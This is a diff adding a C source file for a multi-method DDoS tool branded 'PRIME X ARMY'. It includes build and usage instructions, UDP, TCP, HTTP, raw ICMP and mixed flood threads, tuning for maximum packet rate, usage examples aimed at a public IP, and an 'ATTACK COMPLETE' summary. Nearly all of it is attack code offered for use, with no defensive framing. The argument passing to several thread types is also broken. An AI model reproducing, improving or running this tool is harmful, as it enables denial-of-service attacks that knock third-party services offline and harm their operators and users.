@@ -1,0 +1,397 @@
+/*
+ * PRIME X ARMY - ULTIMATE DDoS BINARY
+ * Compile: gcc -o primex primex.c -lpthread -O3 -march=native -flto -funroll-loops
+ * Usage: ./primex <method> <ip> <port> <duration> <threads>
+ * Methods: udp, tcp, http, icmp, mixed
+ */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <pthread.h>
+#include <time.h>
+#include <signal.h>
+#include <sched.h>
+#include <sys/socket.h>
+#include <fcntl.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/ip_icmp.h>
+#include <errno.h>
+
+// ==================== CONFIG ====================
+#define MAX_THREADS 10000
+#define SOCKET_BUFFER_SIZE (32 * 1024 * 1024)  // 32MB buffer for max throughput
+#define BATCH_SIZE 256  // Send multiple packets per syscall loop
+
+// ==================== GLOBAL STATE ====================
+volatile int running = 1;
+volatile unsigned long long total_sent = 0;
+volatile unsigned long long total_bytes = 0;
+int global_sock = -1;
+struct sockaddr_in global_dest;
+char attack_method[10] = "udp";
+
+// ==================== PAYLOADS ====================
+// UDP payloads optimized for high PPS (small) and bandwidth (large)
+char *udp_payloads[] = {
+    "\x01",                                 // 1 byte - max PPS
+    "\x01\x00",                             // 2 bytes
+    "\x01\x00\x00\x00",                     // 4 bytes
+    "\x01\x00\x00\x00\x00\x00\x00\x00",     // 8 bytes
+    // Large payloads for bandwidth saturation (1400 bytes - typical MTU)
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
+};
+int udp_payload_count = sizeof(udp_payloads) / sizeof(udp_payloads[0]);
+
+// HTTP paths and user agents
+char *http_paths[] = {"/", "/api", "/login", "/wp-admin", "/.env", "/config"};
+char *user_agents[] = {
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
+};
+int http_path_count = sizeof(http_paths) / sizeof(http_paths[0]);
+int ua_count = sizeof(user_agents) / sizeof(user_agents[0]);
+
+// ==================== UTILITIES ====================
+unsigned short checksum(void *b, int len) {
+    unsigned short *buf = b;
+    unsigned int sum = 0;
+    for (; len > 1; len -= 2) sum += *buf++;
+    if (len == 1) sum += *(unsigned char*)buf;
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    return ~sum;
+}
+
+void signal_handler(int sig) {
+    running = 0;
+    printf("\n\n[STATS] Packets: %llu | Data: %llu MB\n", total_sent, total_bytes/(1024*1024));
+    exit(0);
+}
+
+// ==================== ATTACK THREADS ====================
+
+// UDP Flood - High PPS + Bandwidth
+void *udp_thread(void *arg) {
+    int thread_id = (long)arg;
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) sock = global_sock;
+    
+    int buf_size = SOCKET_BUFFER_SIZE;
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
+    
+    // CPU affinity for better performance
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
+    
+    unsigned long long local_sent = 0;
+    unsigned long long local_bytes = 0;
+    
+    // Pre-fetch payload lengths
+    int payload_lens[udp_payload_count];
+    for (int i = 0; i < udp_payload_count; i++) payload_lens[i] = strlen(udp_payloads[i]);
+    
+    while (running) {
+        // Send multiple packets per loop for better throughput
+        for (int b = 0; b < BATCH_SIZE && running; b++) {
+            int idx = rand() % udp_payload_count;
+            int len = payload_lens[idx];
+            if (sendto(sock, udp_payloads[idx], len, 0,
+                       (struct sockaddr*)&global_dest, sizeof(global_dest)) > 0) {
+                local_sent++;
+                local_bytes += len;
+            }
+        }
+        sched_yield();
+    }
+    
+    __sync_fetch_and_add(&total_sent, local_sent);
+    __sync_fetch_and_add(&total_bytes, local_bytes);
+    if (sock != global_sock) close(sock);
+    return NULL;
+}
+
+// TCP SYN Flood - Fast connect/disconnect
+void *tcp_thread(void *arg) {
+    char *ip = (char*)arg;
+    int port = *(int*)(arg + 64);
+    int thread_id = *(int*)(arg + 128);
+    unsigned long long local_sent = 0;
+    
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
+    
+    struct sockaddr_in dest = {.sin_family = AF_INET, .sin_port = htons(port)};
+    dest.sin_addr.s_addr = inet_addr(ip);
+    
+    while (running) {
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock < 0) continue;
+        fcntl(sock, F_SETFL, O_NONBLOCK);
+        connect(sock, (struct sockaddr*)&dest, sizeof(dest));
+        send(sock, "GET / HTTP/1.1\r\n\r\n", 18, MSG_NOSIGNAL);
+        close(sock);
+        local_sent++;
+        if ((local_sent & 0xFF) == 0) sched_yield();
+    }
+    __sync_fetch_and_add(&total_sent, local_sent);
+    return NULL;
+}
+
+// HTTP Flood - Full requests
+void *http_thread(void *arg) {
+    char *ip = (char*)arg;
+    int port = *(int*)(arg + 64);
+    int thread_id = *(int*)(arg + 128);
+    unsigned long long local_sent = 0;
+    
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
+    
+    struct sockaddr_in dest = {.sin_family = AF_INET, .sin_port = htons(port)};
+    dest.sin_addr.s_addr = inet_addr(ip);
+    
+    while (running) {
+        int sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock < 0) continue;
+        struct timeval tv = {1, 0};
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
+            char req[2048];
+            snprintf(req, sizeof(req),
+                "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
+                http_paths[rand() % http_path_count], ip, user_agents[rand() % ua_count]);
+            send(sock, req, strlen(req), MSG_NOSIGNAL);
+            local_sent++;
+        }
+        close(sock);
+        if ((local_sent & 0x3F) == 0) sched_yield();
+    }
+    __sync_fetch_and_add(&total_sent, local_sent);
+    return NULL;
+}
+
+// ICMP Echo Flood (requires root)
+void *icmp_thread(void *arg) {
+    char *ip = (char*)arg;
+    int thread_id = *(int*)(arg + 128);
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (sock < 0) return NULL;
+    
+    int buf_size = SOCKET_BUFFER_SIZE;
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
+    
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
+    
+    struct sockaddr_in dest = {.sin_family = AF_INET};
+    dest.sin_addr.s_addr = inet_addr(ip);
+    char packet[64];
+    struct icmphdr *icmp = (struct icmphdr*)packet;
+    memset(packet, 0, 64);
+    icmp->type = ICMP_ECHO;
+    unsigned long long local_sent = 0;
+    
+    while (running) {
+        icmp->un.echo.id = rand();
+        icmp->un.echo.sequence = rand();
+        icmp->checksum = 0;
+        icmp->checksum = checksum(packet, sizeof(struct icmphdr));
+        sendto(sock, packet, sizeof(struct icmphdr), 0, (struct sockaddr*)&dest, sizeof(dest));
+        local_sent++;
+        if ((local_sent & 0xFFF) == 0) sched_yield();
+    }
+    __sync_fetch_and_add(&total_sent, local_sent);
+    close(sock);
+    return NULL;
+}
+
+// Mixed Flood - Combines UDP/TCP/HTTP
+void *mixed_thread(void *arg) {
+    char *ip = (char*)arg;
+    int port = *(int*)(arg + 64);
+    int thread_id = *(int*)(arg + 128);
+    unsigned long long local_sent = 0;
+    
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
+    
+    while (running) {
+        int type = rand() % 3;
+        if (type == 0) {  // UDP
+            int sock = socket(AF_INET, SOCK_DGRAM, 0);
+            struct sockaddr_in d = {.sin_family = AF_INET, .sin_port = htons(port)};
+            d.sin_addr.s_addr = inet_addr(ip);
+            int idx = rand() % udp_payload_count;
+            sendto(sock, udp_payloads[idx], strlen(udp_payloads[idx]), 0, (struct sockaddr*)&d, sizeof(d));
+            close(sock);
+        } else if (type == 1) {  // TCP
+            int sock = socket(AF_INET, SOCK_STREAM, 0);
+            struct sockaddr_in d = {.sin_family = AF_INET, .sin_port = htons(port)};
+            d.sin_addr.s_addr = inet_addr(ip);
+            fcntl(sock, F_SETFL, O_NONBLOCK);
+            connect(sock, (struct sockaddr*)&d, sizeof(d));
+            send(sock, "GET / HTTP/1.1\r\n\r\n", 18, MSG_NOSIGNAL);
+            close(sock);
+        } else {  // HTTP
+            int sock = socket(AF_INET, SOCK_STREAM, 0);
+            struct sockaddr_in d = {.sin_family = AF_INET, .sin_port = htons(port)};
+            d.sin_addr.s_addr = inet_addr(ip);
+            if (connect(sock, (struct sockaddr*)&d, sizeof(d)) == 0) {
+                char req[512];
+                snprintf(req, sizeof(req), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", ip);
+                send(sock, req, strlen(req), MSG_NOSIGNAL);
+            }
+            close(sock);
+        }
+        local_sent++;
+        if ((local_sent & 0xFF) == 0) sched_yield();
+    }
+    __sync_fetch_and_add(&total_sent, local_sent);
+    return NULL;
+}
+
+// ==================== MAIN ====================
+void banner() {
+    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
+    printf("║          🔥 PRIME X ARMY - ULTIMATE DDoS BINARY 🔥               ║\n");
+    printf("║              UDP | TCP | HTTP | ICMP | MIXED                      ║\n");
+    printf("╚══════════════════════════════════════════════════════════════════╝\n");
+}
+
+void usage(char *prog) {
+    banner();
+    printf("\nUsage: %s <METHOD> <IP> <PORT> <TIME> <THREADS>\n\n", prog);
+    printf("METHODS: udp, tcp, http, icmp, mixed\n");
+    printf("EXAMPLES:\n");
+    printf("  %s udp 1.1.1.1 443 60 2000\n", prog);
+    printf("  %s tcp 1.1.1.1 80 120 1000\n", prog);
+    printf("  sudo %s icmp 1.1.1.1 0 60 1000\n", prog);
+    exit(1);
+}
+
+int main(int argc, char *argv[]) {
+    signal(SIGINT, signal_handler);
+    signal(SIGTERM, signal_handler);
+    srand(time(NULL) ^ getpid());
+    
+    if (argc < 6) usage(argv[0]);
+    
+    char *method = argv[1];
+    char *ip = argv[2];
+    int port = atoi(argv[3]);
+    int duration = atoi(argv[4]);
+    int threads = atoi(argv[5]);
+    
+    if (duration <= 0 || duration > 600) duration = 60;
+    if (threads < 1 || threads > MAX_THREADS) threads = 2000;
+    if (strcmp(method, "icmp") != 0 && (port < 1 || port > 65535)) port = 443;
+    
+    banner();
+    printf("\n[CONFIG] Method: %s | Target: %s:%d | Duration: %ds | Threads: %d\n\n",
+           method, ip, port, duration, threads);
+    
+    // Setup UDP socket if needed
+    if (strcmp(method, "udp") == 0 || strcmp(method, "mixed") == 0) {
+        global_sock = socket(AF_INET, SOCK_DGRAM, 0);
+        if (global_sock < 0) { perror("UDP socket"); exit(1); }
+        int opt = 1, buf_size = SOCKET_BUFFER_SIZE;
+        setsockopt(global_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+        setsockopt(global_sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
+        memset(&global_dest, 0, sizeof(global_dest));
+        global_dest.sin_family = AF_INET;
+        global_dest.sin_port = htons(port);
+        global_dest.sin_addr.s_addr = inet_addr(ip);
+    }
+    
+    // Select thread function
+    void *(*thread_func)(void *) = NULL;
+    if (strcmp(method, "udp") == 0) thread_func = udp_thread;
+    else if (strcmp(method, "tcp") == 0) thread_func = tcp_thread;
+    else if (strcmp(method, "http") == 0) thread_func = http_thread;
+    else if (strcmp(method, "icmp") == 0) thread_func = icmp_thread;
+    else if (strcmp(method, "mixed") == 0) thread_func = mixed_thread;
+    else { printf("Invalid method. Using UDP.\n"); thread_func = udp_thread; }
+    
+    pthread_t tids[threads];
+    for (int i = 0; i < threads; i++) {
+        char *arg = malloc(256);
+        strcpy(arg, ip);
+        memcpy(arg + 64, &port, sizeof(int));
+        memcpy(arg + 128, &i, sizeof(int));
+        if (pthread_create(&tids[i], NULL, thread_func, (void *)(long)i) != 0) {
+            fprintf(stderr, "Failed to create thread %d\n", i);
+            threads = i;
+            break;
+        }
+    }
+    
+    time_t start = time(NULL);
+    unsigned long long last_sent = 0;
+    while (running && (time(NULL) - start) < duration) {
+        int elapsed = time(NULL) - start;
+        int remaining = duration - elapsed;
+        unsigned long long current = total_sent;
+        unsigned long long rate = current - last_sent;
+        double mbps = (total_bytes / (1024.0 * 1024.0)) / (elapsed + 1);
+        printf("\r[%3d/%3d] Sent: %10llu | Rate: %6llu pps | %.2f MB/s | Left: %3ds",
+               elapsed, duration, current, rate, mbps, remaining);
+        fflush(stdout);
+        last_sent = current;
+        sleep(1);
+    }
+    
+    running = 0;
+    printf("\n\n⏳ Waiting for threads to finish...\n");
+    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
+    if (global_sock > 0) close(global_sock);
+    
+    int elapsed = time(NULL) - start;
+    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
+    printf("║                      ✅ ATTACK COMPLETE ✅                        ║\n");
+    printf("╠══════════════════════════════════════════════════════════════════╣\n");
+    printf("║  Total Sent: %-20llu                                      ║\n", total_sent);
+    printf("║  Total Data: %-20llu MB                                   ║\n", total_bytes/(1024*1024));
+    printf("║  Duration:   %d seconds\n", elapsed);
+    printf("║  Avg Rate:   %llu pps\n", elapsed > 0 ? total_sent/elapsed : 0);
+    printf("║  Avg Bandwidth: %.2f MB/s\n", (total_bytes/(1024.0*1024.0))/(elapsed+1));
+    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
+    return 0;
+}
